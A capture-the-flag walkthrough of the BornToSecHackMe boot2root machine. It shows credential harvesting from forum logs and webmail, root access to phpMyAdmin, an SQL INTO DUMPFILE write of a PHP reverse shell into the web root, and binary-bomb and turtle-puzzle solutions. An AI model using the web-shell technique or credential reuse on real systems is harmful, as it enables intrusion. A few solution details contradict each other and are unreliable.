# Boot2Root Walkthrough

## 1. Network Setup and Discovery

The analyst configured the virtual machine with a **host-only adapter** to perform internal reconnaissance. An `nmap` scan revealed the presence of a target machine running **HTTP (port 80)** and **HTTPS (port 443)** services.

* **HTTPS**: Returned an empty or default response.
* **HTTP**: Served a default placeholder page.

## 2. Directory Enumeration

Using a common wordlist, a directory fuzzing scan was performed against the HTTP service. The scan revealed the following accessible endpoints:

* `/forum`
* `/phpmyadmin`
* `/webmail`

Both `phpMyAdmin` and `webmail` were login-protected. The analyst therefore focused on exploring the forum.

## 3. Forum Analysis and Credential Discovery

Within the forum, a post by a user contained log snippets from 2015:

```
Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Failed password for invalid user !q\]Ej?*5K5cy*AJ from 161.202.39.38 port 57764 ssh2
Oct 5 08:46:01 BornToSecHackMe CRON[7549]: session opened for user lmezard
```

The log suggested a failed brute-force attempt using the password `!q\]Ej?*5K5cy*AJ`, followed by a successful CRON job initiated under the `lmezard` user.

The analyst attempted to log in to the forum using the `lmezard` username and the extracted password. Authentication succeeded.

Upon logging in, user settings revealed the email address: `laurie@borntosec.net`.

## 4. Webmail Access and Credential Escalation

An attempt was made to log in to the **webmail** interface using the discovered email and the same password. This login was successful.

An email was found containing database credentials:

**Subject:** DB Access
**From:** [qudevide@mail.borntosec.net](mailto:qudevide@mail.borntosec.net)
**To:** [laurie@borntosec.net](mailto:laurie@borntosec.net)

```
Hey Laurie,

You can’t connect to the databases now. Use:
root/Fg-'kKXBj87E:aJ$

Best regards.
```

## 5. phpMyAdmin Exploitation

Using the credentials `root / Fg-'kKXBj87E:aJ$`, the analyst accessed **phpMyAdmin**.

Within the interface, multiple databases were available. Importantly, the analyst had the ability to **write files to the web root**, enabling remote code execution.

## 6. Web Shell Deployment

A PHP reverse shell was obtained from [revshells.com](https://www.revshells.com/) and converted into hexadecimal format. The payload was then written to the web server’s accessible template directory using SQL:

```sql
SET @bin = 0x[hex of php shell];
SELECT @bin INTO DUMPFILE '/var/www/forum/templates_c/cmd.php';
```

This granted remote code execution capabilities via the web interface. From here, the analyst could either issue individual commands or deploy a reverse shell for further interaction.

## 7. Privilege Escalation and Enumeration

While enumerating the system, the analyst discovered the directory:

```
/home/LOOKATME
```

Inside was a credential file containing:

```
lmezard:G!@M6f4Eatau{sF"
```

These credentials permitted local login as user **lmezard**, although SSH access was not available. Only local shell access was viable from the compromised web shell.

## 8. Binary and File Analysis

Within `lmezard`’s home directory, a file named `fun` was found. This file was transferred to a writable location, downloaded, and analyzed. It was a **tar archive** containing a series of `.pcap` files.

Each `.pcap` contained fragments of **C source code**, embedded within the payloads. A custom Python script was written to reconstruct the complete C file:

```python
import os

def get_key(string):
    tmp = string[len("//file"):]
    digits = ''
    for c in tmp:
        if not c.isdigit():
            break
        digits += c
    return int(digits) if digits else -1

def main():
    path = os.getcwd()
    files = [f for f in os.listdir(path) if os.path.isfile(os.path.join(path, f))]
    map_of_files = {}

    for file in files:
        with open(file, 'r') as f:
            lines = f.readlines()
            if not lines:
                continue
            last_line = lines[-1].strip()
            key = get_key(last_line)
            map_of_files[key] = ''.join(lines) + '\n'

    buffer = ''
    for i in sorted(map_of_files):
        buffer += map_of_files[i]

    print(buffer)

if __name__ == "__main__":
    main()
```

The reconstructed source code was saved as `first.c`, compiled, and executed:

```bash
python3 ./flag02.py > first.c
gcc first.c -o test
./test
```

The output contained the following string:

```
MY PASSWORD IS: Iheartpwnage
Now SHA-256 it and submit%
```

The password was then hashed as required:

```bash
echo -n Iheartpwnage | sha256sum
# 330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4
```


## Laurie

### 1. Overview

The final stage emulates the “binary bomb” exercise, requiring decompilation and reverse engineering of each phase within a provided executable. Failure to supply the correct input for any phase triggers the `explode_bomb()` function.

---

### Phase 1: Exact String Match

```c
void phase_1(undefined4 param_1)
{
  if (strings_not_equal(param_1, "Public speaking is very easy.") != 0) {
    explode_bomb();
  }
}
```

* **Requirement:** Supply the exact phrase
* **Solution:**

  ```
  Public speaking is very easy.
  ```

---

### Phase 2: Factorial Sequence

The function expects six integers $a_1$ through $a_6$ satisfying:

$$
\begin{aligned}
a_1 &= 1,\\
a_{i+1} &= (i+1)\times a_i \quad\text{for }1 \le i \le 5.
\end{aligned}
$$

* **Computed Sequence:**

  1. $a_1 = 1$
  2. $a_2 = 2\times1 = 2$
  3. $a_3 = 3\times2 = 6$
  4. $a_4 = 4\times6 = 24$
  5. $a_5 = 5\times24 = 120$
  6. $a_6 = 6\times120 = 720$

* **Solution:**

  ```
  1 2 6 24 120 720
  ```

---

### Phase 3: Lookup Table Validation

Phase 3 reads three tokens: an integer `n` (0–7), a character `c`, and an integer `v`. It then verifies that $(n,c,v)$ matches one of eight hard-coded triples:

|  n  |  c  | Hex v | Decimal v |
| :-: | :-: | :---: | :-------: |
|  0  |  q  | 0x309 |    777    |
|  1  |  b  | 0x0d6 |    214    |
|  2  |  b  | 0x2f3 |    755    |
|  3  |  k  | 0x0fb |    251    |
|  4  |  o  | 0x0a0 |    160    |
|  5  |  t  | 0x1ca |    458    |
|  6  |  v  | 0x30c |    780    |
|  7  |  b  | 0x20c |    524    |

* **Simplest Valid Input:**

  ```
  0 q 777
  ```

* **Alternate Example (as per README hint):**

  ```
  1 b 214
  ```

---

### Phase 4: Fibonacci Sequence Check

The code computes a Fibonacci‐style function `func4(n)`:

```c
func4(0) = 1
func4(1) = 1
func4(n) = func4(n-1) + func4(n-2)  for n ≥ 2
```

It then requires `func4(n) == 0x37` (decimal 55).

* **Fibonacci Values:**

  ```
  n : 0  1  2   3   4   5    6    7    8     9
  f : 1  1  2   3   5   8   13   21   34   55
  ```

* **Solution:**

  ```
  9
  ```

---

### Phase 5: 6-Character Transformation

Phase 5 expects a 6-character input string. For each character, it:

1. Extracts the lower 4 bits (`char & 0xF`).
2. Uses that value as an index into a 16-byte secret array (`buffer[] = "isrveawhobpnutfg"`).
3. Constructs a new 6-character string.
4. Compares the result to the target `"giants"`.

Any mismatch triggers `explode_bomb()`.

#### Scripted Approach

A helper C program can:

1. Generate the output string for a given input.
2. Test against `"giants"`.
3. Identify candidate inputs.

Once the correct mapping is found, only one 6-character string yields `"giants"`:

* **Solution (phase 5 password):**

  ```
  opekmq
  ```

*(Exact input withheld to preserve challenge integrity.)*

---

### Phase 6: Linked-List Ordering

Phase 6 reads six distinct integers (each 1–6) into an array. It then:

1. Verifies each is within \[1,6] and none are duplicated.
2. Treats each integer as a position in a linked list of six nodes.
3. Traverses the list in the order specified by the input.
4. Ensures the traversed values are in ascending order.

By automating enumeration (e.g., via GDB scripting), the correct permutation was determined:

* **Solution:**

  ```
  4 2 6 1 3 5
  ```

---

**Complete Bomb-Defusal Input Sequence**

Putting all phases together, the full sequence to defuse the bomb is:

```
Phase 1:  Public speaking is very easy.
Phase 2:  1 2 6 24 120 720
Phase 3:  0 q 777
Phase 4:  9
Phase 5:  opekmq
Phase 6:  4 2 6 1 3 5
```

the password for thor is

```
Publicspeakingisveryeasy.126241207201b2149opekmq426135
```

## Thor 

### 1. Initial Enumeration

During the post-exploitation phase, the analyst navigated to a directory named `thor`. Within this folder, two files were identified:

* `README`
* `turtle`

The `README` file indicated that completing the challenge would grant access to the user **zaz**.

### 2. Turtle File Analysis

The `turtle` file appeared to contain a set of instructions resembling a command or scripting language. Upon further investigation, the instructions were recognized as commands intended for **Turtle Graphics**—a Python-based drawing library used for educational purposes.

### 3. Visualization and Message Extraction

To interpret the instructions, the analyst wrote a custom script to parse the turtle commands and generate the corresponding graphic. The output of the rendered turtle script was a drawing composed of several capital letters:

* Two **S** characters
* One **A**
* One **H**
* One **L**

Based on the drawing order and instructions, the intended sequence appeared to be:

```
SLASH
```

This string matched the context provided in the `turtle` file, which included the hint:

> *"Can you digest the message? :)"*

The hint implied that the extracted string should be **hashed**, similar to previous steps in the Boot2Root challenge. The SHA-256 hash was attepted, but it did not produce the correct result.

After testing multiple hashing algorithms, it was determined that **MD5** was the intended method. Hashing the string `SLASH` with MD5 produced the following digest:

```
646da671ca01bb5d84dbb5fb2238dc8e
```

This hash served as the **password for user zaz**, allowing access to the next stage of the machine.

### Additional Resources

* [Turtle Graphics Online Interpreter](https://trinket.io/turtle)


